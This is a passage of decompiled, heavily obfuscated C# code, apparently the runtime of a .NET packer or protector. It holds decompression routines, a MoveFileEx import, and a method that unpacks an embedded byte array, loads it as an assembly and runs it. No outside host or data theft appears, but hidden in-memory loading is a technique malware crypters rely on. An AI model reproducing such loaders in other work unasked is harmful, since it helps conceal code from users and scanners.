            (byte) 176,
            (byte) 110,
            (byte) 82,
            (byte) 160,
            (byte) 133,
            (byte) 182
          };
          goto label_23;
        }
        else
          goto label_34;
      }
      else
        goto label_4;
    }

    static int \u0001([In] string[] obj0)
    {
      byte[] numArray = \u0008.\u0005.\u0001(\u0008.\u0005.\u0082(721));
      if (numArray != null)
        goto label_6;
label_1:
      throw new Exception(\u0008.\u0005.\u0082(770));
label_6:
      Assembly assembly = \u0008.\u0005.\u0001(numArray);
      int num1 = \u0008.\u0005.\u0001(obj0, assembly);
      int num2;
      while (true)
      {
        int num3 = num1;
        if (true)
        {
          num2 = num3;
          if (false)
            num1 = num2;
          else
            break;
        }
        else
          goto label_1;
      }
      return num2;
    }

    static void \u0001([In] \u0004.\u0004 obj0, [In] int obj1, [In] int obj2)
    {
      \u0004.\u0004 obj = obj0;
      int num1 = obj.\u0004 + obj1;
      if (true)
        goto label_14;
label_1:
      obj.\u0004 = num1;
      int num2;
      int num3 = num2;
      int num4 = \u0004.\u0004.\u0001;
      if (true)
      {
        if (num3 > num4)
          throw new InvalidOperationException(\u0008.\u0005.\u0082(815));
        int num5 = obj0.\u0003 - obj2;
        num4 = \u0004.\u0004.\u0002;
        num3 = num5;
      }
      int num6 = num3 & num4;
      int sourceIndex;
      int num7;
      while (true)
      {
        sourceIndex = num6;
        num7 = \u0004.\u0004.\u0001;
        if (false)
          num6 = num7;
        else
          break;
      }
      int num8 = obj1;
      int num9 = num7 - num8;
      int num10 = sourceIndex;
      int num11 = num9;
      if (true)
      {
        if (num10 <= num11 && obj0.\u0003 < num9)
        {
          int num12 = obj1;
          num11 = obj2;
          num10 = num12;
        }
        else
        {
          \u0008.\u0005.\u0001(obj0, sourceIndex, obj1, obj2);
          return;
        }
      }
      if (num10 <= num11)
      {
        Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0003, obj1);
        obj0.\u0003 += obj1;
        return;
      }
      while (obj1-- > 0)
        obj0.\u0001[obj0.\u0003++] = obj0.\u0001[sourceIndex++];
      return;
label_14:
      num2 = num1;
      goto label_1;
    }

    static void \u0001()
    {
      try
      {
        string str1;
        if (true)
        {
          if (true)
            str1 = \u0008.\u0005.\u0082(832);
          else
            goto label_16;
        }
        else
          goto label_4;
label_3:
        string str2 = \u0008.\u0005.\u0082(841);
label_4:
        string str3 = \u0012.\u001D(global::\u0004.\u007E\u0011((object) \u0016.\u0083()));
        if (\u001E.\u007E\u008F((object) str3, str1))
          str3 = \u0093.\u007E\u000E\u0002((object) str3, \u0081.\u007E\u0094((object) str1), \u0081.\u007E\u0094((object) str3) - \u0081.\u007E\u0094((object) str1));
        string[] strArray = \u0094.\u000F\u0002(str3, \u007F.\u0092(\u0008.\u0005.\u0082(862), str2));
        int num1;
        int num2;
        if (strArray != null)
        {
          int length = strArray.Length;
          num2 = 0;
          num1 = length;
        }
        else
          goto label_18;
label_9:
        int index;
        if (num1 > num2)
        {
          \u0006.\u0001.\u0001 = new ArrayList();
          index = 0;
          goto label_16;
        }
        else
          goto label_18;
label_11:
        string str4 = \u0012.\u001E(strArray[index]);
        string str5 = \u0093.\u007E\u000E\u0002((object) str4, 0, \u0081.\u007E\u0094((object) str4) - \u0081.\u007E\u0094((object) str2));
        if (true)
        {
          ResourceManager resourceManager = \u0095.\u0010\u0002(\u007F.\u0092(str5, \u0008.\u0005.\u0082(867)), str3, (System.Type) null);
          if (true)
          {
            if (resourceManager != null)
            {
              int num3 = \u0096.\u007E\u0011\u0002((object) \u0006.\u0001.\u0001, (object) resourceManager);
            }
            ++index;
          }
          else
            goto label_3;
        }
        else
          goto label_18;
label_16:
        num1 = index;
        num2 = strArray.Length;
        if (true)
        {
          int num4 = num2;
          if (num1 < num4)
            goto label_11;
        }
        else
          goto label_9;
label_18:
        if (true)
        {
          if (false)
            goto label_16;
        }
        else
          goto label_11;
      }
      catch
      {
      }
    }

    static \u0004.\u0003.\u0004 \u0001([In] \u0004.\u0003.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0003];
      Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
      return new \u0004.\u0003.\u0004(destinationArray);
    }

    static bool \u0001([In] int obj0, [In] \u0001.\u0004 obj1)
    {
      obj1.\u0001[obj1.\u000E] = (short) 0;
      byte[] numArray1 = obj1.\u0002;
      \u0001.\u0004 obj = obj1;
      int num1;
      int num2 = num1 = obj.\u000E;
      obj.\u000E = num1 + 1;
      int index1 = num2;
      int num3 = (int) (byte) obj0;
      numArray1[index1] = (byte) num3;
      short[] numArray2;
      int index2;
      (numArray2 = obj1.\u0001.\u0001)[index2 = obj0] = (short) ((int) numArray2[(IntPtr) index2] + 1);
      return \u0008.\u0005.\u0001(obj1);
    }

    static unsafe int \u0001([In] byte[] obj0, [In] int obj1, [In] \u0004.\u0004 obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      if (true)
        goto label_6;
label_5:
      *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4);
      return *(int*) ((IntPtr) voidPtr + 12);
label_6:
      *(int*) voidPtr = obj2.\u0003;
      if (obj1 <= obj2.\u0004)
        goto label_8;
      else
        goto label_7;
label_1:
      *(int*) ((IntPtr) voidPtr + 4) = obj1;
      *(int*) ((IntPtr) voidPtr + 8) = obj1 - *(int*) voidPtr;
      if (*(int*) ((IntPtr) voidPtr + 8) > 0)
      {
        Array.Copy((Array) obj2.\u0001, \u0004.\u0004.\u0001 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj0, obj3, *(int*) ((IntPtr) voidPtr + 8));
        obj3 += *(int*) ((IntPtr) voidPtr + 8);
        obj1 = *(int*) voidPtr;
      }
      Array.Copy((Array) obj2.\u0001, *(int*) voidPtr - obj1, (Array) obj0, obj3, obj1);
      obj2.\u0004 -= *(int*) ((IntPtr) voidPtr + 4);
      if (obj2.\u0004 < 0)
        throw new InvalidOperationException();
      goto label_5;
label_7:
      obj1 = obj2.\u0004;
      goto label_1;
label_8:
      *(int*) voidPtr = obj2.\u0003 - obj2.\u0004 + obj1 & \u0004.\u0004.\u0002;
      goto label_1;
    }

    static unsafe int \u0001([In] \u0004.\u0005 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      if (obj3 < 0)
        throw new ArgumentOutOfRangeException(\u0008.\u0005.\u0082(876));
      int num1 = obj0.\u0003;
      int num2;
      for (int index = 7; (num1 & index) == 0; num1 = num2)
      {
        *(int*) voidPtr = 0;
        int num3;
        int num4;
        int num5;
        while (true)
        {
          num2 = obj0.\u0003;
          num3 = 0;
          if (num3 == 0)
          {
            int num6;
            if (num2 > num3)
              num6 = obj3;
            else
              goto label_11;
label_9:
            int num7 = 0;
label_10:
            if (num6 > num7)
            {
              obj1[obj2++] = (byte) obj0.\u0001;
              obj0.\u0001 >>= 8;
              obj0.\u0003 -= 8;
              --obj3;
              *(int*) voidPtr = *(int*) voidPtr + 1;
              continue;
            }
label_11:
            if (obj3 != 0)
            {
              *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
              num6 = obj3;
              if (true)
              {
                int num8 = *(int*) ((IntPtr) voidPtr + 4);
                if (num6 > num8)
                  obj3 = *(int*) ((IntPtr) voidPtr + 4);
                Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
                obj0.\u0001 += obj3;
                num4 = obj0.\u0001 - obj0.\u0002;
                num5 = 1;
                if (num5 == 0)
                {
                  num7 = num5;
                  num6 = num4;
                  goto label_10;
                }
                else
                  goto label_17;
              }
              else
                goto label_9;
            }
            else
              goto label_12;
          }
          else
            break;
        }
        index = num3;
        continue;
label_12:
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
        goto label_20;
label_17:
        if ((num4 & num5) != 0)
        {
          obj0.\u0001 = (uint) obj0.\u0001[obj0.\u0001++] & (uint) byte.MaxValue;
          obj0.\u0003 = 8;
        }
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr + obj3;
label_20:
        return *(int*) ((IntPtr) voidPtr + 8);
      }
      throw new InvalidOperationException(\u0008.\u0005.\u0082(897));
    }

    static void \u0001([In] \u0004.\u0004 obj0, [In] int obj1)
    {
      if (true)
      {
        \u0004.\u0004 obj = obj0;
        int num1;
        int num2 = num1 = obj.\u0004;
        obj.\u0004 = num1 + 1;
        if (num2 == \u0004.\u0004.\u0001)
          throw new InvalidOperationException(\u0008.\u0005.\u0082(815));
      }
      if (false)
        return;
      byte[] numArray = obj0.\u0001;
      \u0004.\u0004 obj2 = obj0;
      int num3;
      int num4 = num3 = obj2.\u0003;
      obj2.\u0003 = num3 + 1;
      int index = num4;
      int num5 = (int) (byte) obj1;
      numArray[index] = (byte) num5;
      obj0.\u0003 &= \u0004.\u0004.\u0002;
    }

    static void \u0001([In] int obj0, [In] \u0008.\u0002 obj1)
    {
      int num1 = obj0;
      int num2;
      int num3;
      for (int index = \u0008.\u0002.\u0003; num1 != index; num1 = num2)
      {
        num2 = obj0;
        num3 = \u0008.\u0002.\u0004;
        if (true)
        {
          if (false)
            index = num3;
          else if (num2 < num3 || obj0 > \u0008.\u0002.\u0001)
            goto label_6;
          else
            goto label_15;
        }
        else
          goto label_8;
      }
      int num4 = 6;
label_3:
      obj0 = num4;
      goto label_15;
label_6:
      throw new ArgumentOutOfRangeException(\u0008.\u0005.\u0082(934));
label_8:
      if (num2 != num3)
      {
        obj1.\u0015 = obj0;
        num4 = obj0;
      }
      else
        goto label_12;
label_10:
      if (true)
      {
        \u000E obj = obj1.\u0001;
        \u0008.\u0005.\u0001(num4, obj);
      }
      else
        goto label_3;
label_12:
      if (true)
        return;
      goto label_6;
label_15:
      int num5 = obj1.\u0015;
      if (false)
      {
        num4 = num5;
        goto label_10;
      }
      else
      {
        num3 = obj0;
        num2 = num5;
        goto label_8;
      }
    }

    static unsafe int \u0001([In] \u0001.\u0004.\u0001 obj0)
    {
label_0:
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      *(int*) voidPtr = 0;
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0001.Length)
      {
        if (true)
        {
          *(int*) voidPtr = *(int*) voidPtr + (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] * (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        else
          goto label_0;
      }
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    static unsafe void \u0001([In] \u0001.\u0004.\u0001 obj0, [In] \u0001.\u0004.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      *(int*) ((IntPtr) voidPtr + 8) = -1;
      *(int*) ((IntPtr) voidPtr + 12) = 0;
      while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
      {
        int num = 1;
        *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
        if (*(int*) ((IntPtr) voidPtr + 16) != 0)
        {
          *(int*) voidPtr = 6;
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          if (*(int*) ((IntPtr) voidPtr + 8) != *(int*) ((IntPtr) voidPtr + 16))
          {
            short[] numArray;
            IntPtr index;
            (numArray = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 16))] = (short) ((int) numArray[index] + 1);
            num = 0;
          }
        }
        else
          goto label_16;
label_4:
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          if (++num >= *(int*) voidPtr)
            break;
        }
        if (num < *(int*) ((IntPtr) voidPtr + 4))
        {
          short[] numArray;
          IntPtr index;
          (numArray = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 8))] = (short) ((int) numArray[index] + (int) (short) num);
          continue;
        }
        if (*(int*) ((IntPtr) voidPtr + 8) != 0)
        {
          short[] numArray;
          IntPtr index;
          (numArray = obj0.\u0001)[(int) (index = (IntPtr) \u0001.\u0004.\u0005)] = (short) ((int) numArray[index] + 1);
          continue;
        }
        if (num <= 10)
        {
          short[] numArray;
          IntPtr index;
          (numArray = obj0.\u0001)[(int) (index = (IntPtr) \u0001.\u0004.\u0006)] = (short) ((int) numArray[index] + 1);
          continue;
        }
        short[] numArray1;
        IntPtr index1;
        (numArray1 = obj0.\u0001)[(int) (index1 = (IntPtr) \u0001.\u0004.\u0007)] = (short) ((int) numArray1[index1] + 1);
        continue;
label_16:
        *(int*) voidPtr = 138;
        *(int*) ((IntPtr) voidPtr + 4) = 3;
        goto label_4;
      }
    }

    static void \u0001([In] \u0004.\u0003.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1 = obj2;
        int num2;
        while (true)
        {
          num2 = num1 - 1;
          if (false)
            num1 = num2;
          else
            break;
        }
        obj2 = num2;
        if (num1 > 0)
        {
          byte[] numArray = obj0.\u0001;
          \u0004.\u0003.\u0003 obj = obj0;
          int num3;
          int num4 = num3 = obj.\u0001;
          obj.\u0001 = num3 + 1;
          int index = num4;
          int num5 = (int) obj0.\u0001[obj1++];
          numArray[index] = (byte) num5;
          obj0.\u0001 &= (int) short.MaxValue;
          int num6 = obj1;
          if (true)
            num6 &= (int) short.MaxValue;
          obj1 = num6;
        }
        else
          break;
      }
    }

    static void \u0001([In] \u0004.\u0004 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1 = obj2;
        int num2;
        while (true)
        {
          num2 = num1 - 1;
          if (false)
            num1 = num2;
          else
            break;
        }
        obj2 = num2;
        if (num1 > 0)
        {
          byte[] numArray = obj0.\u0001;
          \u0004.\u0004 obj = obj0;
          int num3;
          int num4 = num3 = obj.\u0003;
          obj.\u0003 = num3 + 1;
          int index = num4;
          int num5 = (int) obj0.\u0001[obj1++];
          numArray[index] = (byte) num5;
          obj0.\u0003 &= \u0004.\u0004.\u0002;
          int num6 = obj1;
          if (true)
          {
            int num7 = \u0004.\u0004.\u0002;
            num6 &= num7;
          }
          obj1 = num6;
        }
        else
          break;
      }
    }

    static unsafe void \u0001([In] \u0001.\u0004.\u0001 obj0, [In] int[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      obj0.\u0001 = new byte[(int) checked ((uint) obj0.\u0001.Length)];
      *(int*) voidPtr = obj1.Length / 2;
      *(int*) ((IntPtr) voidPtr + 4) = (*(int*) voidPtr + 1) / 2;
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = 0;
      while (*(int*) ((IntPtr) voidPtr + 12) < obj0.\u0003)
      {
        obj0.\u0001[*(int*) ((IntPtr) voidPtr + 12)] = 0;
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
      }
      int[] numArray1 = new int[(int) checked ((uint) *(int*) voidPtr)];
      numArray1[*(int*) voidPtr - 1] = 0;
      *(int*) ((IntPtr) voidPtr + 16) = *(int*) voidPtr - 1;
      while (*(int*) ((IntPtr) voidPtr + 16) >= 0)
      {
        if (obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] != -1)
        {
          *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)] + 1;
          if (*(int*) ((IntPtr) voidPtr + 20) > obj0.\u0003)
          {
            *(int*) ((IntPtr) voidPtr + 20) = obj0.\u0003;
            *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
          }
          numArray1[obj1[2 * *(int*) ((IntPtr) voidPtr + 16)]] = numArray1[obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1]] = *(int*) ((IntPtr) voidPtr + 20);
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 24) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
          ++obj0.\u0001[*(int*) ((IntPtr) voidPtr + 24) - 1];
          obj0.\u0001[obj1[2 * *(int*) ((IntPtr) voidPtr + 16)]] = (byte) numArray1[*(int*) ((IntPtr) voidPtr + 16)];
        }
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 1;
      }
      if (*(int*) ((IntPtr) voidPtr + 8) == 0)
        return;
      int index1 = obj0.\u0003 - 1;
      do
      {
        do
          ;
        while (obj0.\u0001[--index1] == 0);
        do
        {
          --obj0.\u0001[index1];
          int[] numArray2;
          int[] numArray3 = numArray2 = obj0.\u0001;
          int index2;
          index1 = index2 = index1 + 1;
          int index3 = index2;
          int num = numArray3[(IntPtr) index3] + 1;
          numArray2[index2] = num;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (1 << obj0.\u0003 - 1 - index1);
        }
        while (*(int*) ((IntPtr) voidPtr + 8) > 0 && index1 < obj0.\u0003 - 1);
      }
      while (*(int*) ((IntPtr) voidPtr + 8) > 0);
      obj0.\u0001[obj0.\u0003 - 1] += *(int*) ((IntPtr) voidPtr + 8);
      obj0.\u0001[obj0.\u0003 - 2] -= *(int*) ((IntPtr) voidPtr + 8);
      int num1 = 2 * *(int*) ((IntPtr) voidPtr + 4);
      *(int*) ((IntPtr) voidPtr + 28) = obj0.\u0003;
      while (*(int*) ((IntPtr) voidPtr + 28) != 0)
      {
        *(int*) ((IntPtr) voidPtr + 32) = obj0.\u0001[*(int*) ((IntPtr) voidPtr + 28) - 1];
        while (*(int*) ((IntPtr) voidPtr + 32) > 0)
        {
          int index4 = 2 * obj1[num1++];
          if (obj1[index4 + 1] == -1)
          {
            obj0.\u0001[obj1[index4]] = (byte) *(int*) ((IntPtr) voidPtr + 28);
            *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
          }
        }
        *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) - 1;
      }
    }

    static void \u0001([In] int obj0, [In] byte[] obj1, [In] \u0001.\u0004 obj2, [In] bool obj3, [In] int obj4)
    {
      \u0008.\u0005.\u0001((\u0004.\u0006) obj2.\u0001, obj3 ? 1 : 0, 3);
      \u0008.\u0005.\u0001((\u0004.\u0006) obj2.\u0001);
      \u0008.\u0005.\u0001(obj0, (\u0004.\u0006) obj2.\u0001);
      int num1 = ~obj0;
      if (true)
      {
        \u0007 obj = obj2.\u0001;
        \u0008.\u0005.\u0001(num1, (\u0004.\u0006) obj);
        num1 = obj4;
      }
      int num2 = obj0;
      byte[] numArray = obj1;
      \u0007 obj5 = obj2.\u0001;
      \u0008.\u0005.\u0001(num1, num2, numArray, (\u0004.\u0006) obj5);
      \u0008.\u0005.\u0001(obj2);
    }

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    static extern bool \u0001(string _param0, string _param1, int _param2);

    static bool \u0001([In] \u0004.\u0005 obj0) => obj0.\u0001 == obj0.\u0002;

    static void \u0001()
    {
      try
      {
        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
          return;
        MemoryManager.\u0001 = new MemoryManager();
      }
      catch
      {
      }
    }

    static int \u0001([In] \u0004.\u0005 obj0, [In] int obj1)
    {
      int num1 = obj0.\u0003;
      int num2;
      int num3;
      while (true)
      {
        int num4;
        for (int index1 = obj1; num1 < index1; num1 = num4)
        {
          num4 = obj0.\u0001;
          int num5 = obj0.\u0002;
          if (false)
          {
            index1 = num5;
          }
          else
          {
            if (num4 == num5)
            {
              num2 = -1;
              if (true)
                goto label_14;
            }
            \u0004.\u0005 obj2 = obj0;
            int num6 = (int) obj2.\u0001;
            byte[] numArray = obj0.\u0001;
            \u0004.\u0005 obj3 = obj0;
            int num7;
            int num8 = num7 = obj3.\u0001;
            obj3.\u0001 = num7 + 1;
            int index2 = num8;
            int num9 = ((int) numArray[index2] & (int) byte.MaxValue | ((int) obj0.\u0001[obj0.\u0001++] & (int) byte.MaxValue) << 8) << obj0.\u0003;
            obj2.\u0001 = (uint) (num6 | num9);
            obj0.\u0003 += 16;
            break;
          }
        }
        num3 = (int) obj0.\u0001;
        if (false)
          num1 = num3;
        else
          break;
      }
      long num10 = (long) (uint) num3;
      int num11 = 1;
      int num12;
      while (true)
      {
        int num13 = obj1;
        int num14;
        while (true)
        {
          num14 = num13 & 31;
          if (false)
            num13 = num14;
          else
            break;
        }
        num12 = (num11 << num14) - 1;
        if (false)
          num11 = num12;
        else
          break;
      }
      long num15 = (long) num12;
      num2 = (int) (num10 & num15);
label_14:
      do
        ;
      while (false);
      return num2;
    }

    static \u0005() => \u0006.\u0002.\u0001(typeof (\u0008.\u0005));
  }
}
